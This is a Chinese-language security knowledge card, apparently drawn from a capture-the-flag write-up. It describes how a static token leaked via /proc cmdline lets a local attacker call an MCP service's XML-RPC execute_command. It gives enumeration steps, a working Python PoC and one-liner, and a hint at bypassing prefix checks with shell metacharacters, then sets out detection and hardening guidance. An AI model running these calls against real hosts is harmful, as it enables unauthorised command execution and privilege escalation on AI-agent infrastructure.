---
id: ai-security-mcp-security-xmlrpc-execute-command-token-leak
title: MCP 服务暴露 XML-RPC execute_command：静态 token 从进程命令行/源码泄露后本地任意命令执行
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: mcp-xmlrpc-execute-command-token-leak
aliases:
- MCP XML-RPC execute_command
- mcp_server_secure
- MCP 服务命令执行
- XML-RPC 任意命令
- token 命令行泄露
- 本地 MCP 后渗透
tags:
- ai-security
- mcp
- xmlrpc
- command-execution
- token-leak
- proc-cmdline
- local-privilege
- post-exploitation
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V155
  verified_at: '2026-11-06T07:49:03+08:00'
  notes: 已对照原文auth节核对：/proc/11/cmdline暴露/opt/mcp_service/mcp_server_secure_<hash>.py、token、XML-RPC execute_command('cat /flag')、54321/RPC2、经pickle执行python -c回写结果均与原文叙述一致。未验证点：原文未附MCP服务源码/XML-RPC调用截图，token泄露路径部分为推断；卡内confidence=medium已注明。
---

## 一句话结论

当主机上运行 MCP 服务并以 XML-RPC `execute_command(token, command)` 提供命令执行能力时，若 token 是静态字符串且可从进程命令行（`/proc/<pid>/cmdline`）、服务脚本或配置中读到，攻击者只要拿到任意本地文件读取/代码执行，就能调用 `http://127.0.0.1:54321/RPC2` 以服务身份执行任意命令（原文用 `cat /flag` 读取 flag），无需突破 MCP 自身的工具权限模型。

## 原理

- MCP 服务通常以本地进程运行，部分实现会用 XML-RPC/HTTP 暴露内部方法，方便 Agent 或同机组件调用。`execute_command` 这类方法把命令字符串直接交给 shell/`subprocess`，本身没有参数白名单、路径限制或用户隔离。
- 鉴权依赖一个 token 参数。若 token 是硬编码/启动参数中的静态值，而不是每次启动随机生成并安全保存，那么同机任何能读 `/proc/<pid>/cmdline`、服务源码、配置文件或环境变量的主体都能拿到它。
- `/proc/<pid>/cmdline` 默认对同用户/同容器可见，且常包含启动命令与 `--token`/`--key` 参数；服务脚本路径（如 `/opt/mcp_service/mcp_server_secure_<hash>.py`）也可能被进程命令行暴露，脚本内再写死 token。
- XML-RPC 客户端只需 `ServerProxy('http://127.0.0.1:54321/RPC2').execute_command(token, cmd)`；返回通常是 `{'stdout':..., 'stderr':...}`，可直接回显命令结果。
- 风险放大点：该服务往往以比 Web 应用更高的权限运行（独立服务账号/root），或能访问 Web 进程读不到的文件；因此它成为本地提权/横向的跳板，而不是普通 SSRF。
- 原文链：Web 侧 SSRF/Redis/pickle 拿到代码执行后，从 `/proc/<pid>/cmdline` 发现 MCP 服务脚本与 token，最终用 `python -c` 调 XML-RPC `execute_command('mcp_secure_token_...', 'cat /flag')` 读取 flag。

## 触发条件

- 目标主机运行 MCP 服务，且监听本地 XML-RPC/HTTP 端口（原文 `127.0.0.1:54321/RPC2`）。
- 服务暴露 `execute_command`（或等价的 `run`/`exec`/`shell`）方法，接受 token + 命令字符串。
- token 为静态值，可从 `/proc/<pid>/cmdline`、服务源码、配置文件、环境变量或进程内存读取。
- 攻击者已具备本地文件读取或代码执行（Web RCE、SSRF 读文件、容器内落地等），能访问回环地址。
- 服务进程权限足以读取目标文件或执行所需命令。

## 利用步骤

1. 枚举本机进程与监听端口：`ps auxww`、`/proc/*/cmdline`、`ss -lntp`，寻找 `mcp_server`、`mcp_service`、`54321`、`RPC2` 等特征。
2. 读取可疑进程的 `/proc/<pid>/cmdline` 与服务脚本路径；在脚本/配置中搜索 `token`、`execute_command`、`xmlrpc`、`SimpleXMLRPCServer`。
3. 确认 XML-RPC 端点与方法签名：向 `http://127.0.0.1:54321/RPC2` 发送 `system.listMethods` 或直接构造 `execute_command` 调用。
4. 用泄露的 token 执行无害命令（`id`、`hostname`）验证；确认返回结构含 stdout/stderr。
5. 在授权范围内读取目标文件（原文 `cat /flag`）或执行必要的后渗透命令；记录命令、返回与时间。
6. 若 token 不在命令行，尝试服务脚本、systemd unit、环境变量、容器配置或进程内存；仍失败则回到文件读取/配置审计。

## PoC

```python
import xmlrpc.client

proxy = xmlrpc.client.ServerProxy("http://127.0.0.1:54321/RPC2")
token = "mcp_secure_token_xxxxxxxx"   # 从 /proc/<pid>/cmdline 或服务脚本读取
result = proxy.execute_command(token, "id")
print(result.get("stdout", "") + result.get("stderr", ""))
```

等价的一行命令（原文用于 pickle 后执行）：

```bash
python -c "import xmlrpc.client,sys; s=xmlrpc.client.ServerProxy('http://127.0.0.1:54321/RPC2'); r=s.execute_command('mcp_secure_token_xxxxxxxx','cat /flag'); sys.stdout.write((r.get('stdout') or '')+(r.get('stderr') or ''))"
```

## 变体与关联

- 变体：MCP 服务改用 HTTP JSON-RPC/WebSocket，方法名不同但同样暴露 `execute_command`；按实际协议构造请求。
- 变体：token 从环境变量（`/proc/<pid>/environ`）、systemd unit、容器编排配置或日志中泄露；枚举面比命令行更广。
- 变体：服务只允许固定命令前缀，可通过参数注入/命令拼接（`;`、`|`、`$()`）绕过；或通过写脚本/配置文件间接执行。
- 关联：[[ai-security-mcp-security-hidden-tool-hardcoded-key-root-credential]]（MCP 工具硬编码密钥/root 凭据）；[[ai-security-mcp-security-burp-mcp-server-exposure-unsafe-portproxy]]（MCP server 暴露与不安全端口转发）；[[ai-security-agent-security-dify-code-sandbox-network-egress]]（AI 平台内部服务的命令执行面）。
- 关联：本地 MCP 服务常被 Agent 以高权限调用；评估 AI 应用时应把“Agent 可调用的本地服务”纳入权限边界，而不只看 MCP 工具描述。

## 检测与防御

- 防御：MCP 服务不要用静态 token；每次启动生成随机 token，存入权限受控的文件/密钥环，并通过安全通道传递，避免出现在命令行与环境变量。
- 防御：`execute_command` 不应接受任意字符串；改为固定工具/参数白名单，或在强沙箱（无网络、只读文件系统、非 root）内执行。
- 防御：XML-RPC/HTTP 端点只监听 Unix socket 或回环，并增加调用方身份校验（mTLS、Unix socket 权限、SO_PEERCRED），不要仅靠一个可泄露的 bearer token。
- 检测：监控 `/proc/*/cmdline` 中出现 `--token`/`--key` 的进程；监控本机对 `127.0.0.1:54321` 等 MCP 端口的异常 `execute_command` 调用；审计 MCP 服务日志中的命令参数与调用来源。
- 响应：轮换泄露 token、重启服务、检查该服务执行过的命令与访问的文件；排查同机其他 AI 服务是否使用相同静态 token。
